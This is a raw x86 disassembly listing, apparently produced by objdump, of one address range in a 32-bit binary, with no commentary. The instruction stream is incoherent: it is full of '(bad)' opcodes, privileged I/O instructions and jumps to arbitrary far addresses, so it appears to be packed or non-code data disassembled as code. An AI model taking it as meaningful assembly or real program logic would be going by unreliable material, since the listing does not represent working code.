  40c406:	div    DWORD PTR [esi]
  40c408:	xchg   ebp,eax
  40c409:	inc    esp
  40c40a:	push   edi
  40c40b:	std    
  40c40c:	loope  0x40c3e9
  40c40e:	cld    
  40c40f:	fldcw  WORD PTR [ebp+0x78]
  40c412:	imul   eax,DWORD PTR [ecx-0x65076e43],0xffffffd1
  40c419:	ds inc esi
  40c41b:	jno    0x40c3f7
  40c41d:	or     DWORD PTR ds:0x1059734a,0x1e
  40c424:	jg     0x40c464
  40c426:	fcmovbe st,st(0)
  40c428:	xlat   BYTE PTR ds:[ebx]
  40c429:	clc    
  40c42a:	std    
  40c42b:	jnp    0x40c43a
  40c42d:	lock push ss
  40c42f:	loopne 0x40c403
  40c431:	out    0x1a,eax
  40c433:	xchg   BYTE PTR [edi+eiz*2],bh
  40c436:	into   
  40c437:	add    al,0x43
  40c439:	mov    ds:0x9c607077,eax
  40c43e:	ins    DWORD PTR es:[edi],dx
  40c43f:	lock jbe 0x40c422
  40c442:	pop    ebx
  40c443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c444:	adc    BYTE PTR [esi-0x7],0x1e
  40c448:	xchg   edi,eax
  40c449:	in     eax,0xf1
  40c44b:	xchg   ebp,eax
  40c44c:	shl    BYTE PTR [ebp-0x4d],cl
  40c44f:	repnz popf 
  40c451:	xor    al,0x4c
  40c453:	lahf   
  40c454:	rcr    esi,0x55
  40c457:	adc    al,0xcb
  40c459:	cmp    bh,BYTE PTR [eax]
  40c45b:	sahf   
  40c45c:	into   
  40c45d:	stos   DWORD PTR es:[edi],eax
  40c45e:	cmp    al,0x85
  40c460:	mov    bl,0x17
  40c462:	mov    bh,0x45
  40c464:	xor    BYTE PTR [ebp+ecx*2+0x64],bh
  40c468:	sbb    BYTE PTR [esi+ebx*8-0xaf9c44e],dh
  40c46f:	adc    DWORD PTR [esi],edx
  40c471:	and    al,BYTE PTR [edi-0x43]
  40c474:	add    BYTE PTR [edi+edi*2+0x1f21f555],al
  40c47b:	mov    dh,0x64
  40c47d:	mov    ebx,0xe3f47a68
  40c482:	jecxz  0x40c46f
  40c484:	repz add DWORD PTR [ecx+0x4f],edi
  40c488:	mov    DWORD PTR [edi-0x7c29c4d],eax
  40c48e:	xor    BYTE PTR [esi+edx*2+0x4f],ch
  40c492:	(bad)  
  40c493:	xor    BYTE PTR [eax+0x6d],ch
  40c496:	xchg   ecx,eax
  40c497:	fwait
  40c498:	dec    ecx
  40c499:	mov    ah,0xd3
  40c49b:	jne    0x40c4b1
  40c49d:	jne    0x40c47c
  40c49f:	pop    ebx
  40c4a0:	pop    edi
  40c4a1:	test   DWORD PTR [edx-0x76],esi
  40c4a4:	sbb    al,dl
  40c4a6:	adc    BYTE PTR [edi+0x73],cl
  40c4a9:	fisttp QWORD PTR [eax-0x4e]
  40c4ac:	invlpg BYTE PTR [edx-0x69]
  40c4b0:	push   cs
  40c4b1:	repnz sub cl,dl
  40c4b4:	(bad)  
  40c4b5:	fst    QWORD PTR [edi]
  40c4b7:	test   eax,0x556a668d
  40c4bc:	pop    es
  40c4bd:	aas    
  40c4be:	test   BYTE PTR [esi+eax*1],cl
  40c4c1:	mov    bh,bl
  40c4c3:	leave  
  40c4c4:	sbb    dh,dl
  40c4c6:	shr    esi,1
  40c4c8:	xchg   edi,eax
  40c4c9:	cwde   
  40c4ca:	jmp    0x5e72072e
  40c4cf:	adc    DWORD PTR [esi],ebx
  40c4d1:	add    BYTE PTR [esi+0x8],cl
  40c4d4:	addr16 call 0x6111:0x330404ed
  40c4dc:	pop    ds
  40c4dd:	ds enter 0x5927,0x5e
  40c4e2:	in     al,dx
  40c4e3:	inc    edi
  40c4e5:	out    dx,al
  40c4e6:	rcl    DWORD PTR [esi+0x6b],0x97
  40c4ea:	mov    BYTE PTR fs:[ebx+0xca2bdab],dh
  40c4f1:	scas   eax,DWORD PTR es:[edi]
  40c4f2:	fcomp  DWORD PTR [ebp+0x647ce1d5]
  40c4f8:	out    0x2c,al
  40c4fa:	adc    BYTE PTR [ebx-0xc9e4096],al
  40c500:	xor    ah,al
  40c502:	int    0xff
  40c504:	iret   
  40c505:	inc    edi
  40c506:	mov    eax,ds:0xcd4bc5e1
  40c50b:	fiadd  WORD PTR [ebp+0x7f]
  40c50e:	push   0x25
  40c510:	lds    ecx,FWORD PTR [edx-0x22746f93]
  40c516:	(bad)  
  40c517:	ds push esi
  40c519:	in     eax,dx
  40c51a:	push   ss
  40c51b:	xor    DWORD PTR cs:[edi+0xd],esp
  40c51f:	ret    
  40c520:	mov    ch,dl
  40c522:	jmp    0x47dffb4c
  40c527:	mov    WORD PTR [edi],fs
  40c529:	dec    esi
  40c52a:	inc    esi
  40c52b:	cmp    DWORD PTR [edi+0x2982c484],0xe226a6b8
  40c535:	mov    al,0x12
  40c537:	dec    edi
  40c538:	mov    al,ds:0xba07ac03
  40c53d:	(bad)  
  40c53e:	cld    
  40c53f:	daa    
  40c540:	test   BYTE PTR [eax],ch
  40c542:	dec    eax
  40c543:	loope  0x40c57d
  40c545:	cld    
  40c546:	and    bl,dh
  40c548:	or     eax,0xca27be3e
  40c54d:	aam    0xd1
  40c54f:	in     al,dx
  40c550:	lea    esp,[ecx-0x4ac5f55f]
  40c556:	xor    edx,0xfffffffb
  40c559:	cmp    al,0xdb
  40c55b:	adc    DWORD PTR [edx+0x6a17bb7b],0x3a021d16
  40c565:	in     eax,dx
  40c566:	xor    DWORD PTR [ecx+0x7a],ecx
  40c569:	in     al,0x49
  40c56b:	pop    eax
  40c56c:	mov    es,WORD PTR [esi-0x53]
  40c56f:	out    0xa3,al
  40c571:	test   DWORD PTR [eax],ebp
  40c573:	mov    ds,WORD PTR [ebp+0x346e2a25]
  40c579:	cmp    al,0x74
  40c57c:	repz push ss
  40c57e:	add    eax,DWORD PTR [edi-0x624e7d20]
  40c584:	sbb    al,0x81
  40c586:	mov    esi,0x232ffbb9
  40c58b:	sbb    ah,BYTE PTR [ebp+0x64]
  40c58e:	cmp    al,0xd0
  40c590:	inc    ebx
  40c591:	jb     0x40c559
  40c593:	jg     0x40c535
  40c595:	rcl    BYTE PTR [ebx],1
  40c597:	pop    es
  40c598:	iret   
  40c599:	fstp   QWORD PTR [esp+edi*2+0x5c0e319e]
  40c5a0:	je     0x40c559
  40c5a2:	jns    0x40c5f5
  40c5a4:	pop    es
  40c5a5:	fwait
  40c5a6:	jae    0x40c596
  40c5a8:	(bad)  
  40c5a9:	idiv   bl
  40c5ab:	jae    0x40c579
  40c5ad:	jmp    0xa6ba:0xc5bc0a04
  40c5b4:	sbb    eax,0x6281dfee
  40c5b9:	dec    esp
  40c5ba:	scas   al,BYTE PTR es:[edi]
  40c5bb:	aam    0xa4
  40c5bd:	sbb    BYTE PTR [eax],dh
  40c5bf:	push   edx
  40c5c0:	inc    ebx
  40c5c1:	shr    DWORD PTR [eax],cl
  40c5c3:	xor    al,al
  40c5c5:	sti    
  40c5c6:	mov    ebp,cs
  40c5c8:	(bad)  
  40c5c9:	lods   al,BYTE PTR ds:[esi]
  40c5ca:	cs mov cl,0xa6
  40c5cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5ce:	push   edx
  40c5cf:	std    
  40c5d0:	mov    bl,0x71
  40c5d2:	nop
  40c5d3:	cmc    
  40c5d4:	mov    BYTE PTR [eax+0x67],al
  40c5d7:	push   esp
  40c5d8:	fwait
  40c5d9:	dec    ecx
  40c5da:	je     0x40c62e
  40c5dc:	sub    BYTE PTR [esi+0x6cde2adc],ch
  40c5e2:	pop    edi
  40c5e3:	inc    edi
  40c5e4:	scas   al,BYTE PTR es:[edi]
  40c5e5:	add    eax,0x620140c9
  40c5ea:	xor    DWORD PTR [ebx],edx
  40c5ec:	mov    dh,0x82
  40c5ee:	cdq    
  40c5ef:	xor    eax,0xa4d6089f
  40c5f4:	loope  0x40c589
  40c5f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5f7:	adc    esi,DWORD PTR [esi]
  40c5f9:	xchg   ebx,eax
  40c5fa:	leave  
  40c5fb:	and    BYTE PTR [edx+0x50e7a47f],cl
  40c601:	lock scas eax,DWORD PTR es:[edi]
  40c603:	outs   dx,BYTE PTR ds:[esi]
  40c604:	test   al,0x10
  40c606:	repnz mov dh,0xe5
  40c609:	hlt    
  40c60a:	in     eax,dx
  40c60b:	das    
  40c60c:	and    DWORD PTR [ebp-0x5a7a549b],0xffffffa9
  40c613:	xor    edx,DWORD PTR [edi+esi*8]
  40c616:	ja     0x40c651
  40c618:	pop    ebx
  40c619:	or     BYTE PTR [eax+0x1ce0e66],0xb7
  40c620:	sbb    DWORD PTR ds:0x6db91cb7,edi
  40c626:	gs addr16 mov bh,0xbf
  40c62a:	out    0x9c,eax
  40c62c:	inc    esi
  40c62d:	xchg   edx,eax
  40c62e:	lods   al,BYTE PTR ds:[esi]
  40c62f:	cmp    DWORD PTR [ebx+0x7f],edi
  40c632:	imul   ebx,DWORD PTR [edx],0xffffffd3
  40c635:	aad    0xe0
  40c637:	popf   
  40c638:	test   DWORD PTR [ebp-0x4e],esi
  40c63b:	adc    ah,ah
  40c63d:	adc    DWORD PTR [ecx+0x598a7142],esi
  40c643:	fstp   QWORD PTR [eax]
  40c645:	mov    edx,0x4ff3ce5d
  40c64a:	imul   ebx,DWORD PTR [esi+0x2446488e],0xffffffe7
  40c651:	pop    esi
  40c652:	inc    esp
  40c653:	cmp    ch,bh
  40c655:	loop   0x40c5dc
  40c657:	je     0x40c680
  40c659:	mov    eax,eax
  40c65b:	aaa    
  40c65c:	inc    ebp
  40c65d:	pop    ebx
  40c65e:	daa    
  40c65f:	loopne 0x40c662
  40c661:	add    al,0x71
  40c663:	jne    0x40c644
  40c665:	add    al,0x2d
  40c667:	in     al,0x40
  40c669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c66a:	mov    esi,ecx
  40c66c:	jae    0x40c6b6
  40c66e:	cmp    eax,eax
  40c670:	push   eax
  40c671:	inc    edi
  40c672:	push   es
  40c673:	dec    edi
  40c674:	inc    esp
  40c675:	sar    ebp,0x2e
  40c678:	inc    ecx
  40c679:	cmp    DWORD PTR [esi+0x62],0xffffffe0
  40c67d:	ror    DWORD PTR [ebx],cl
  40c67f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c680:	push   ecx
  40c681:	mov    esp,0x4c299a96
  40c686:	(bad)  
  40c687:	icebp  
  40c688:	mov    WORD PTR ds:0x8e989c62,cs
  40c68e:	iret   
  40c68f:	loop   0x40c6b4
  40c691:	dec    edx
  40c692:	fnstsw WORD PTR [ebp-0x1b242b73]
  40c698:	ins    DWORD PTR es:[edi],dx
  40c699:	mov    bh,0xcd
  40c69b:	ret    
  40c69c:	mov    edi,0x5a1de3d4
  40c6a1:	or     al,0x6c
  40c6a3:	dec    BYTE PTR [ebp+0x42]
  40c6a6:	and    al,0x8f
  40c6a8:	fldpi  
  40c6aa:	jle    0x40c640
  40c6ac:	stos   BYTE PTR es:[edi],al
  40c6ad:	and    bl,BYTE PTR [ecx+0x36]
  40c6b0:	xchg   edx,eax
  40c6b1:	xchg   ecx,eax
  40c6b2:	pop    ss
  40c6b3:	and    BYTE PTR [edi-0x7299503c],al
  40c6b9:	(bad)  
  40c6ba:	push   ebp
  40c6bb:	das    
  40c6bc:	sub    BYTE PTR [ebx],0x15
  40c6bf:	or     BYTE PTR [edx+0x4a],ch
  40c6c2:	jp     0x40c6c2
  40c6c4:	gs out 0xd,eax
  40c6c7:	jbe    0x40c70e
  40c6c9:	inc    eax
  40c6ca:	mov    edx,0xb5fe3354
  40c6cf:	ds pushf 
  40c6d1:	sub    DWORD PTR [eax-0xa197afb],edi
  40c6d7:	adc    ah,cl
  40c6d9:	(bad)  
  40c6da:	xlat   BYTE PTR ds:[ebx]
  40c6db:	jle    0x40c729
  40c6dd:	pusha  
  40c6de:	gs push ds
  40c6e0:	dec    ecx
  40c6e1:	test   al,0x38
  40c6e3:	and    BYTE PTR [eax+eiz*2],al
  40c6e6:	xor    ch,BYTE PTR [esi-0x13]
  40c6e9:	ret    0x9e5a
  40c6ec:	pop    eax
  40c6ed:	dec    ecx
  40c6ee:	arpl   WORD PTR [edi-0x45a53a19],bx
  40c6f4:	out    dx,eax
  40c6f5:	xchg   ebp,eax
  40c6f6:	shl    DWORD PTR [ebx],cl
  40c6f8:	cmp    edi,DWORD PTR [eax+0x1a]
  40c6fb:	xchg   esp,eax
  40c6fc:	xor    al,0xac
  40c6fe:	out    0x1b,al
  40c700:	push   edi
  40c701:	jmp    0x8807bf9c
  40c706:	aad    0xb0
  40c708:	hlt    
  40c709:	arpl   WORD PTR [ebp-0x61],bx
  40c70c:	push   es
  40c70d:	fdiv   DWORD PTR [ebp+0x50]
  40c710:	inc    esi
  40c711:	clc    
  40c712:	test   BYTE PTR [eax],dl
  40c714:	cmp    DWORD PTR [ebx+edi*8-0x6d8d9d42],edx
  40c71b:	jno    0x40c73d
  40c71d:	xor    bh,BYTE PTR [ebp+0x75]
  40c720:	push   ebp
  40c721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c722:	bound  ebx,QWORD PTR [ebx-0xe3bc557]
  40c728:	(bad)
  40c72b:	push   esi
  40c72c:	mov    dl,0x6b
  40c72e:	or     edx,DWORD PTR [ecx+0x51]
  40c731:	imul   ebp,DWORD PTR [eax-0x10f8dedc],0xfffffffb
  40c738:	out    dx,al
  40c739:	aam    0x79
  40c73b:	je     0x40c7aa
  40c73d:	mov    eax,ds:0x557a58dc
  40c742:	xor    eax,0x2cba671b
  40c747:	adc    al,0xb1
  40c749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c74a:	mov    eax,ds:0xb470e2a5
  40c74f:	xor    eax,0x3e0b4cb
  40c754:	pop    ss
  40c755:	out    0xf1,al
  40c757:	adc    edi,esi
  40c759:	and    eax,0x751b2c2e
  40c75e:	fistp  WORD PTR [esp+esi*1]
  40c761:	or     al,0x12
  40c763:	adc    esp,DWORD PTR [esi+0x58]
  40c766:	aam    0xe7
  40c768:	cmc    
  40c769:	jl     0x40c7b3
  40c76b:	mov    WORD PTR [esi+ebx*4],ds
  40c76e:	and    BYTE PTR [eax],cl
  40c770:	stos   BYTE PTR es:[edi],al
  40c771:	retf   
  40c772:	cmp    al,0xdb
  40c774:	mov    dl,0xef
  40c776:	and    DWORD PTR [eax+edi*1+0x65],esp
  40c77a:	push   es
  40c77b:	mov    dl,0xaa
  40c77d:	mov    edi,0xe88877b0
  40c782:	out    0xbe,al
  40c784:	dec    esi
  40c785:	popf   
  40c786:	icebp  
  40c787:	sbb    al,ch
  40c789:	(bad)  
  40c78a:	mov    dl,0xf7
  40c78c:	mov    DWORD PTR [eax+0x7d68b8ed],esp
  40c792:	cmp    al,0x91
  40c794:	imul   edx
  40c796:	lock rol DWORD PTR [ecx-0x16],cl
  40c79a:	jb     0x40c77c
  40c79c:	test   al,dl
  40c79e:	adc    eax,0x4a560c2d
  40c7a3:	inc    ecx
  40c7a4:	add    BYTE PTR [ecx-0x1068b19c],dl
  40c7aa:	(bad)  
  40c7ab:	push   ecx
  40c7ac:	mov    dl,0x5d
  40c7ae:	bound  esi,QWORD PTR [ebp-0x54]
  40c7b1:	fisub  WORD PTR [esi-0x40]
  40c7b4:	pop    es
  40c7b5:	adc    eax,0xdc23f87b
  40c7ba:	sub    eax,0x40ed6c92
  40c7bf:	scas   eax,DWORD PTR es:[edi]
  40c7c0:	outs   dx,DWORD PTR ds:[esi]
  40c7c1:	leave  
  40c7c2:	mov    ah,0xeb
  40c7c4:	rcl    DWORD PTR [ecx+0x6eb44de5],0x97
  40c7cb:	hlt    
  40c7cc:	fsub   DWORD PTR [eax+0x1d7d6115]
  40c7d2:	mov    dh,BYTE PTR ds:0xaca2a041
  40c7d8:	sub    BYTE PTR [edx-0x1],bl
  40c7db:	pop    ss
  40c7dc:	push   esp
  40c7dd:	pop    es
  40c7de:	cmp    DWORD PTR [edi+0x6b],0x14
  40c7e2:	fwait
  40c7e3:	out    0x17,al
  40c7e5:	int    0xf2
  40c7e7:	and    bl,0xfe
  40c7ea:	add    DWORD PTR [edx+0x16],esi
  40c7ed:	imul   ebx,DWORD PTR [esi+0x68],0xeae9c2c8
  40c7f4:	les    esp,FWORD PTR [esi+ebx*1-0x36]
  40c7f8:	add    BYTE PTR [ebx+0x3694854a],ch
  40c7fe:	xor    dl,BYTE PTR [edx+0x21]
  40c801:	or     eax,0x2487eac2
  40c806:	cmp    BYTE PTR [edx-0x9],ah
  40c809:	sbb    bl,0xd0
  40c80c:	mov    edi,0x569680d5
  40c811:	ret    0xd749
  40c814:	or     BYTE PTR [eax+esi*4+0x49],ah
  40c818:	mov    al,ds:0xc841b9ae
  40c81d:	push   cs
  40c81e:	das    
  40c81f:	adc    bh,cl
  40c821:	mov    esp,0x2785a9cc
  40c826:	pop    edi
  40c827:	call   0x7bf3:0xdb6e20c1
  40c82e:	inc    ebx
  40c82f:	mov    dh,0x88
  40c831:	sub    DWORD PTR [ecx+0x20],esi
  40c834:	jbe    0x40c8af
  40c836:	inc    esp
  40c837:	jae    0x40c84c
  40c839:	pusha  
  40c83a:	retf   0x2814
  40c83d:	test   eax,0x7f8beaf2
  40c842:	test   eax,0xe65bf527
  40c847:	sub    DWORD PTR [ebx+0x78181b9d],esi
  40c84d:	push   ebp
  40c84f:	call   0x6065d989
  40c854:	lds    ebp,FWORD PTR [eax+edx*2+0x488e3b84]
  40c85b:	(bad)  
  40c85c:	dec    ebx
  40c85d:	xchg   edx,eax
  40c85e:	test   eax,0x32bf582b
  40c863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c865:	into   
  40c866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c867:	lea    eax,[edx+edi*2+0x18ec0b41]
  40c86e:	fucomip st,st(1)
  40c870:	loope  0x40c864
  40c872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c873:	sbb    BYTE PTR [eax-0x15],dh
  40c876:	std    
  40c877:	or     al,0xa2
  40c879:	sub    ecx,DWORD PTR [esi+edx*8-0x6beb6241]
  40c880:	rol    DWORD PTR [eax],0x34
  40c883:	cmp    al,0xfb
  40c885:	cli    
  40c886:	sbb    eax,0x4a407bb5
  40c88b:	aas    
  40c88c:	jmp    0x7625:0x3bffeb1c
  40c893:	push   ds
  40c894:	adc    DWORD PTR [edi],edi
  40c896:	sbb    al,0x5b
  40c898:	outs   dx,BYTE PTR ds:[esi]
  40c899:	inc    ebp
  40c89a:	fst    st(7)
  40c89c:	mov    ecx,0x46d2d6da
  40c8a1:	push   ds
  40c8a2:	lods   eax,DWORD PTR ds:[esi]
  40c8a3:	xor    DWORD PTR [ecx+0x51],ebp
  40c8a6:	adc    eax,0x490f943d
  40c8ab:	push   edx
  40c8ac:	sbb    DWORD PTR [ebp-0x23],edi
  40c8af:	push   ss
  40c8b0:	cmp    ecx,DWORD PTR [eax]
  40c8b2:	enter  0x67b6,0xd7
  40c8b6:	retf   
  40c8b7:	mov    edx,0x8f1177f0
  40c8bc:	xchg   DWORD PTR [edi+0xc],eax
  40c8bf:	ffreep st(6)
  40c8c1:	and    DWORD PTR [esi+0x7b],edx
  40c8c4:	out    0x9e,al
  40c8c6:	push   edx
  40c8c7:	xchg   esp,eax
  40c8c8:	outs   dx,BYTE PTR ds:[esi]
  40c8c9:	jne    0x40c884
  40c8cb:	(bad)  [edi]
  40c8cd:	dec    edx
  40c8ce:	xchg   ebp,eax
  40c8cf:	xchg   esp,eax
  40c8d0:	icebp  
  40c8d1:	mov    ch,0xad
  40c8d3:	cld    
  40c8d4:	inc    ebx
  40c8d5:	cli    
  40c8d6:	(bad)  
  40c8d7:	out    dx,al
  40c8d8:	mov    eax,0xbb6404f1
  40c8dd:	mov    bh,0xf8
  40c8df:	pop    ebp
  40c8e0:	mov    esp,DWORD PTR [ebp+0x288186ce]
  40c8e6:	mov    edx,0x8d5ebc0d
  40c8eb:	icebp  
  40c8ec:	(bad)  
  40c8ee:	leave  
  40c8ef:	mov    cl,0x72
  40c8f1:	fbstp  TBYTE PTR [ebp+0x9ad4eb4]
  40c8f7:	shl    edx,1
  40c8f9:	pusha  
  40c8fa:	and    bl,BYTE PTR [ebx-0x16f6eeb1]
  40c900:	aas    
  40c901:	in     al,dx
  40c902:	jbe    0x40c8e5
  40c904:	push   edx
  40c905:	adc    esp,ecx
  40c907:	cmc    
  40c908:	dec    ecx
  40c909:	outs   dx,BYTE PTR ds:[esi]
  40c90a:	mov    edx,0x46ec0696
  40c90f:	fsubrp st(5),st
  40c911:	cmp    DWORD PTR [edx-0x76467424],esp
  40c917:	jle    0x40c8c5
  40c919:	mov    DWORD PTR [edx+0xdb584ca],ebp
  40c91f:	inc    ecx
  40c920:	mov    esi,0x4e63e774
  40c925:	add    eax,0xd5e1672e
  40c92a:	dec    ecx
  40c92b:	in     eax,dx
  40c92c:	jle    0x40c91c
  40c92e:	add    ecx,DWORD PTR [ecx+0x55fdc363]
  40c934:	adc    ah,BYTE PTR [ecx]
  40c936:	dec    ebx
  40c937:	and    eax,0x8e40cc6e
  40c93c:	pop    ss
  40c93d:	repnz loope 0x40c968
  40c940:	bound  ebx,QWORD PTR [edi+0x49]
  40c943:	xchg   esp,eax
  40c944:	dec    ebx
  40c945:	fidivr DWORD PTR [ebx]
  40c947:	stos   DWORD PTR es:[edi],eax
  40c948:	dec    edi
  40c949:	ins    BYTE PTR es:[edi],dx
  40c94a:	les    edi,FWORD PTR [ecx]
  40c94c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c94d:	shl    DWORD PTR [ebp-0x67891c69],1
  40c953:	rcl    DWORD PTR [edi],0x13
  40c956:	imul   ebp,DWORD PTR [esi+0x61],0x26
  40c95a:	add    eax,0xb58a995b
  40c95f:	clc    
  40c960:	or     al,0x40
  40c962:	aaa    
  40c963:	cmp    eax,0xf367b777
  40c968:	xchg   ebx,eax
  40c969:	repnz imul ebp,DWORD PTR ds:0xd170635a,0x25cd6c53
  40c974:	mov    ch,0x5b
  40c976:	test   eax,0x788904f6
  40c97b:	stos   DWORD PTR es:[edi],eax
  40c97c:	loopne 0x40c9e9
  40c97e:	or     dh,BYTE PTR [edi-0x22]
  40c981:	bound  esi,QWORD PTR [ecx-0x6]
  40c984:	iret   
  40c985:	ins    DWORD PTR es:[edi],dx
  40c986:	adc    BYTE PTR [esi-0x1ab0fa39],ch
  40c98c:	sub    edx,ecx
  40c98e:	cli    
  40c98f:	dec    ebx
  40c990:	retf   
  40c991:	es inc ebx
  40c993:	xor    al,0xf4
  40c995:	adc    cl,0xe9
  40c998:	xor    cl,BYTE PTR [ebx-0x95ec7dc]
  40c99e:	scas   al,BYTE PTR es:[edi]
  40c99f:	out    0x77,eax
  40c9a1:	stos   DWORD PTR es:[edi],eax
  40c9a2:	or     eax,0xff49c97c
  40c9a7:	(bad)  
  40c9a9:	out    0x18,eax
  40c9ab:	lds    edx,FWORD PTR ds:0xadeaa09d
  40c9b1:	stos   DWORD PTR es:[edi],eax
  40c9b2:	and    ah,BYTE PTR [edx-0xe]
  40c9b5:	jmp    0x64787ab2
  40c9ba:	mov    esp,0xbe0a5c0c
  40c9bf:	es dec ecx
  40c9c1:	repnz int3 
  40c9c3:	inc    ebx
  40c9c4:	in     eax,dx
  40c9c5:	adc    al,0x80
  40c9c7:	xor    al,0x2
  40c9c9:	jne    0x40c9ff
  40c9cb:	stc    
  40c9cc:	cmp    DWORD PTR [ebp-0x4d],ebx
  40c9cf:	cmp    esp,edx
  40c9d1:	mov    cl,0x1c
  40c9d3:	mov    eax,esi
  40c9d5:	push   eax
  40c9d6:	ds mov ebp,0x13f5e2b2
  40c9dc:	inc    esi
  40c9dd:	adc    ebp,DWORD PTR [eax]
  40c9df:	sbb    DWORD PTR [ecx-0x1387b724],esi
  40c9e5:	ds pop ecx
  40c9e7:	mov    ecx,0x3df2fd83
  40c9ec:	adc    DWORD PTR ds:0x6d577abc,edx
  40c9f2:	outs   dx,BYTE PTR ds:[esi]
  40c9f3:	fisubr WORD PTR [esi-0x12]
  40c9f6:	pushf  
  40c9f7:	mov    bh,0x3
  40c9f9:	int    0x71
  40c9fb:	xor    DWORD PTR [ebp-0xcaa3ac2],0x5a
  40ca02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca03:	mov    ebp,0x69773600
  40ca08:	lock mov DWORD PTR [edi],edi
  40ca0b:	cwde   
  40ca0c:	loopne 0x40ca89
  40ca0e:	mov    esp,0x45a19401
  40ca13:	lea    esi,[ecx]
  40ca15:	bound  ebp,QWORD PTR [eax+0x727b1917]
  40ca1b:	or     DWORD PTR [eax+0x15110975],ecx
  40ca21:	xchg   edi,eax
  40ca22:	dec    ebx
  40ca23:	pop    ecx
  40ca24:	mul    al
  40ca26:	nop
  40ca27:	pop    edx
  40ca28:	je     0x40ca19
  40ca2a:	xchg   edi,eax
  40ca2b:	dec    edx
  40ca2c:	sbb    DWORD PTR [edx],esp
  40ca2e:	xchg   esi,ecx
  40ca30:	xor    al,BYTE PTR [edx+0x5c4bf683]
  40ca36:	cld    
  40ca37:	cmp    BYTE PTR [edi-0x3590c4eb],bl
  40ca3d:	fistp  QWORD PTR [edi]
  40ca3f:	mov    ah,0xfb
  40ca41:	mov    esp,esi
  40ca43:	pop    ds
  40ca44:	int3   
  40ca45:	addr16 dec edx
  40ca47:	pusha  
  40ca48:	sbb    DWORD PTR cs:[ebx],eax
  40ca4b:	pop    ds
  40ca4c:	lods   eax,DWORD PTR ds:[esi]
  40ca4d:	cmp    dl,BYTE PTR [eax+0x2]
  40ca50:	cmove  esi,esp
  40ca53:	out    0xd7,al
  40ca55:	call   0x953c:0xa79276a2
  40ca5c:	nop
  40ca5d:	(bad)
  40ca60:	jo     0x40ca55
  40ca62:	outs   dx,BYTE PTR ds:[esi]
  40ca63:	les    ecx,FWORD PTR [ebp+0x7d]
  40ca66:	push   ebp
  40ca67:	jmp    0x40ca7c
  40ca69:	out    0xcb,al
  40ca6b:	add    BYTE PTR [edi-0x7580e68a],0xcd
  40ca72:	dec    edi
  40ca73:	loopne 0x40ca1d
  40ca75:	sub    al,0xd5
  40ca77:	outs   dx,BYTE PTR ds:[esi]
  40ca78:	lahf   
  40ca79:	shl    DWORD PTR [esi-0x5f4c0c03],1
  40ca7f:	clc    
  40ca80:	retf   0xba2b
  40ca83:	and    dx,bx
  40ca86:	mov    bl,0xca
  40ca88:	add    ch,BYTE PTR [ecx]
  40ca8a:	retf   0x4f29
  40ca8d:	xchg   edx,eax
  40ca8e:	ins    BYTE PTR es:[edi],dx
  40ca8f:	add    ebx,DWORD PTR [edi-0x6e1ad843]
  40ca95:	pop    ebx
  40ca96:	imul   ebp,DWORD PTR [ebp-0x14],0x819fecd0
  40ca9d:	mov    ah,0x6d
  40ca9f:	push   ds
  40caa0:	fld    QWORD PTR [esi+edi*8+0x56f88223]
  40caa7:	pop    edi
  40caa8:	jmp    DWORD PTR [esi+ebx*8]
  40caab:	xor    ecx,eax
  40caad:	pop    ebx
  40caae:	adc    dl,bl
  40cab0:	add    ebp,eax
  40cab2:	jne    0x40ca7e
  40cab4:	adc    DWORD PTR [esi-0x3f],esi
  40cab7:	cmc    
  40cab8:	pop    es
  40cab9:	dec    edi
  40caba:	mov    edi,ebx
  40cabc:	jb     0x40ca78
  40cabe:	ficomp DWORD PTR [edx]
  40cac0:	ret    0x144
  40cac3:	jns    0x40ca81
  40cac5:	jg     0x40cb10
  40cac7:	inc    ebp
  40cac8:	nop
  40cac9:	mov    bl,0xfa
  40cacb:	mov    al,ds:0x41b996fe
  40cad0:	lock and edi,DWORD PTR [ebx-0x13ad424d]
  40cad7:	mov    al,ds:0x379f5709
  40cadc:	mov    eax,ds:0x4428d1e5
  40cae1:	fnsave [edx-0x13828b66]
  40cae7:	push   0x7cc36343
  40caec:	pop    ebp
  40caed:	fdivp  st(4),st
  40caef:	jns    0x40caab
  40caf1:	adc    BYTE PTR [ecx+0x4],bl
  40caf4:	fldenv [edi+0x72]
  40caf7:	mov    ebx,0x1c1e5f45
  40cafc:	test   eax,0x38d19ad4
  40cb01:	mov    edi,0xf9968add
  40cb06:	call   0xcae3f18f
  40cb0b:	cmp    al,0x86
  40cb0d:	sbb    esp,eax
  40cb0f:	sub    esi,ebp
  40cb11:	hlt    
  40cb12:	push   ss
  40cb13:	mov    al,0x50
  40cb15:	xor    al,0x81
  40cb17:	inc    esp
  40cb18:	sbb    BYTE PTR [edx-0x36221cfd],al
  40cb1e:	shl    ah,cl
  40cb20:	lahf   
  40cb21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb22:	(bad)  [ecx+0x57a541b7]
  40cb28:	inc    esi
  40cb29:	jmp    0xc6bb:0x9feb9209
  40cb30:	scas   al,BYTE PTR es:[edi]
  40cb31:	or     eax,0xf14ad242
  40cb36:	fsub   st(0),st
  40cb39:	ret    
  40cb3a:	icebp  
  40cb3b:	pop    ss
  40cb3c:	or     al,0x6f
  40cb3e:	jmp    0x9821:0xcfafb5a5
  40cb45:	sbb    DWORD PTR [ebx-0x5b7d27fb],0x4b507cc7
  40cb4f:	aad    0xa7
  40cb51:	cli    
  40cb52:	dec    esi
  40cb53:	int    0xe1
  40cb55:	mov    cs,ebp
  40cb57:	jno    0x40caf3
  40cb59:	imul   edx,DWORD PTR [ebp-0x5836a06],0x5da162a9
  40cb63:	jmp    0xdc3d:0xbdeeb3c
  40cb6a:	nop
  40cb6b:	popa   
  40cb6c:	mov    dl,0x90
  40cb6e:	push   ds
